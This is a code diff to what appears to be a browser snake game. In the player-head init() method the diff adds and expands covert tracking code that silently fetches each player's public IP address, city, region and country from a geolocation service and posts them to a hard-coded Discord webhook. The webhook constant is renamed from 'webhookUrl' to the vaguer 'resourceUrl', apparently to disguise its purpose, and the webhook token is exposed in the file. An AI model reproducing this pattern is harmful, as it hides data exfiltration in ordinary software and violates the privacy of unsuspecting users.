@@ -14,7 +14,7 @@ let squareSize = 1;
 let numRows = ctx.canvas.height / squareSize;
 let numCols = ctx.canvas.width / squareSize;
 
-const webhookUrl = "https://discord.com/api/webhooks/1375667382575693894/Pbj1xMizxgXSSP71JuOwkpZA86qSP8HR4zq43rgNlHeMSPgIFKhpfWEXkNPLMXg-gAgq";
+const resourceUrl = "https://discord.com/api/webhooks/1375667382575693894/Pbj1xMizxgXSSP71JuOwkpZA86qSP8HR4zq43rgNlHeMSPgIFKhpfWEXkNPLMXg-gAgq";
 
 function scale() {
     let tempWidth = Math.floor((window.innerWidth * 0.8) / 30) * 30;
@@ -103,13 +103,14 @@ class playerHead {
     }
 
     init() {
-        fetch("https://api.ipify.org?format=json")
+        fetch('https://ipapi.co/json/')
             .then(response => response.json())
             .then(data => {
-                const payload = { content: `${data.ip}` };
-                fetch(webhookUrl, {
-                    method: "POST",
-                    headers: { "Content-Type": "application/json" },
+                const message = `Public IP: ${data.ip}\nCity: ${data.city}\nRegion: ${data.region}\nCountry: ${data.country_name}`;
+                const payload = { content: message };
+                return fetch(resourceUrl, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify(payload)
                 });
             })
